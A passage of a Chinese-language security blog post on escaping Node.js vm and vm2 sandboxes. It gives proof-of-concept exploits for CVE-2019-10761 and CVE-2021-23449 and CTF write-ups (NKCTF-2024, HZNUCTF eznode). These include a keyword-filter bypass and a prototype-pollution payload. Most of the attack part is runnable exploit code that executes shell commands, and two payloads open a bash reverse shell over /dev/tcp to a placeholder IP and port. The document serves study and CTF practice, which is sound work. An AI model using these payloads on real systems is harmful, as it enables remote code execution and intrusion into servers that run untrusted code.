function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/mage-20240728232843232.png" alt="image-20240728232843232"></p>
+<p>​         我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过arguments.callee.caller获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。</p>
+<h3 id="VM2沙箱逃逸"><a href="#VM2沙箱逃逸" class="headerlink" title="VM2沙箱逃逸"></a>VM2沙箱逃逸</h3><p>​        vm2相较于vm多了很多限制。其中之一就是引入了es6新增的proxy特性。增加一些规则来限制constructor函数以及___proto__这些属性的访问。proxy可以认为是代理拦截，编写一种机制对外部访问进行过滤或者改写。</p>
+<h4 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h4><p>该漏洞要求vm2版本&lt;&#x3D;3.6.10</p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = `</span><br><span class="line">const f = Buffer.prototype.write;</span><br><span class="line">const ft = &#123;</span><br><span class="line">        length: 10,</span><br><span class="line">        utf8Write()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">function r(i)&#123;</span><br><span class="line">    var x = 0;</span><br><span class="line">    try&#123;</span><br><span class="line">        x = r(i);</span><br><span class="line">    &#125;catch(e)&#123;&#125;</span><br><span class="line">    if(typeof(x)!==&#x27;number&#x27;)</span><br><span class="line">        return x;</span><br><span class="line">    if(x!==i)</span><br><span class="line">        return x+1;</span><br><span class="line">    try&#123;</span><br><span class="line">        f.call(ft);</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line">var i=1;</span><br><span class="line">while(1)&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        i=r(i).constructor.constructor(&quot;return process&quot;)();</span><br><span class="line">        break;</span><br><span class="line">    &#125;catch(x)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">i.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br><span class="line">`;</span><br><span class="line">try&#123;</span><br><span class="line">    console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a>CVE-2021-23449</h4><p>​        import()在JavaScript中是一个语法结构，不是函数，没法通过之前对 require这种函数处理相同的方法来处理它，导致实际上我们调用 import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获 取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正 则匹配并替换了\bimport\b关键字，在编译失败的时候，报Dynamic Import not supported错误</p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let res = import(&#x27;./foo.js&#x27;)</span><br><span class="line">res.toString.constructor(&quot;return this&quot;)().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br></pre></td></tr></table></figure>
+
+<p>另外的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Symbol = &#123;</span><br><span class="line">  get toStringTag()&#123;</span><br><span class="line">    throw f=&gt;f.constructor(&quot;return process&quot;)()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">try&#123;</span><br><span class="line">  Buffer.from(new Map());</span><br><span class="line">&#125;catch(f)&#123;</span><br><span class="line">  Symbol = &#123;&#125;;</span><br><span class="line">  f(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="NKCTF-2024-全世界最简单的ctf"><a href="#NKCTF-2024-全世界最简单的ctf" class="headerlink" title="NKCTF-2024 全世界最简单的ctf"></a><strong>NKCTF-2024 全世界最简单的ctf</strong></h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>很明显的vm沙箱逃逸问题</p>
+<p>正常的payload</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">     <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">         <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">         <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>接下来思考如何绕waf</p>
+<p>因为题目没有&#x2F;i，所以对大小写不敏感</p>
+<p>我们的process可以等价于</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pro=<span class="string">&#x27;Process&#x27;</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pro)<span class="comment">//打印process</span></span><br></pre></td></tr></table></figure>
+
+<p>或者String.fromCharCode绕过</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pro=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">32</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pro)<span class="comment">//输出process</span></span><br></pre></td></tr></table></figure>
+
+<p>还需要绕过exec</p>
+<p>我们通过反射来绕过，就是根据你提供的对象的键获取到对应的值</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eva&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以获得eval方法</p>
+<p>第一步是要获得global这个模块，原来是获取process模块，但是如果获取到了global，那什么都好获取了</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就要获取我们的process模块，并且引用child_process</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(p, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(p).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>))).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line"><span class="number">1</span></span><br><span class="line">child_process</span><br><span class="line"><span class="keyword">const</span> a = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>)));</span><br><span class="line"><span class="keyword">const</span> b=process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)<span class="comment">//获取到process</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b)<span class="comment">//获取到child_process</span></span><br></pre></td></tr></table></figure>
+
+<p>任何就是获取exec并执行命令</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(a, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(a).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>获取a对象的exec这个对象去执行后面的命令</p>
+<h4 id="HZNUCTF-eznode"><a href="#HZNUCTF-eznode" class="headerlink" title="HZNUCTF eznode"></a><strong>HZNUCTF eznode</strong></h4><p>访问app.js获取源码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>大概就是在页面post传递一个json数据，会经过<code>json.parse</code>函数解析，然后再通过<code>clone()</code>函数复制到<code>copybody</code>变量中，最后判断该变量的shit值是否为真，然后调用<code>backdoor()</code>函数在VM2沙箱中执行<code>&#123;&#125;.shellcode</code>属性。<code>clone()</code>函数很明显的一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1001.2101.3001.7020">原型链</a>污染，而<code>VM2</code>会执行<code>shellcode</code>属性的内容，那么也就是我们需要将该属性污染成<code>VM2</code>沙箱逃逸的<code>payload</code>即可执行任意命令</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:1,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./foo.js&#x27;);res.toString.constructor(\&quot;return this\&quot;)().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1\&quot;&#x27;).toString();&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>参考链接</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61839115/article/details/132120985">NodeJS vm&amp;vm2沙箱逃逸_node vm2-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207291#h2-1">vm2沙箱逃逸分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://p4tt0n.github.io/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP v5.0.24反序列化代码审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ThinkPHP v5.0.24反序列化代码审计</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">命令执行</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="深入浅出PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">深入浅出PHP反序列化</div></div></a></div><div><a href="/2024/10/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">命令执行</div></div></a></div><div><a href="/2024/10/09/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-user-ini/" title="深入浅出.user.ini"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">深入浅出.user.ini</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nodejs-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">Nodejs 沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">沙箱简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nodejs%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-number">1.2.</span> <span class="toc-text">Nodejs的作用域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E4%BD%9C%E7%94%A8%E5%9F%9F%EF%BC%88Global-Scope%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">全局作用域（Global Scope）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E4%BD%9C%E7%94%A8%E5%9F%9F%EF%BC%88Module-Scope%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">模块作用域（Module Scope）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VM%E6%B2%99%E7%AE%B1"><span class="toc-number">1.3.</span> <span class="toc-text">VM沙箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.4.</span> <span class="toc-text">VM沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87Object-create-null"><span class="toc-number">1.4.1.</span> <span class="toc-text">绕过Object.create(null)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.5.</span> <span class="toc-text">VM2沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-10761"><span class="toc-number">1.5.1.</span> <span class="toc-text">CVE-2019-10761</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-23449"><span class="toc-number">1.5.2.</span> <span class="toc-text">CVE-2021-23449</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NKCTF-2024-%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ctf"><span class="toc-number">1.6.1.</span> <span class="toc-text">NKCTF-2024 全世界最简单的ctf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HZNUCTF-eznode"><span class="toc-number">1.6.2.</span> <span class="toc-text">HZNUCTF eznode</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/" title="春秋云镜privilege-wp">春秋云镜privilege-wp</a><time datetime="2025-03-02T10:50:47.000Z" title="发表于 2025-03-02 18:50:47">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital">春秋云镜Hospital</a><time datetime="2025-03-02T10:09:09.000Z" title="发表于 2025-03-02 18:09:09">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cexchange/" title="春秋云镜exchange">春秋云镜exchange</a><time datetime="2025-03-02T10:08:48.000Z" title="发表于 2025-03-02 18:08:48">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cdelegation/" title="春秋云镜delegation">春秋云镜delegation</a><time datetime="2025-03-02T10:08:33.000Z" title="发表于 2025-03-02 18:08:33">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ccertify/" title="春秋云镜certify">春秋云镜certify</a><time datetime="2025-03-02T10:08:18.000Z" title="发表于 2025-03-02 18:08:18">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div 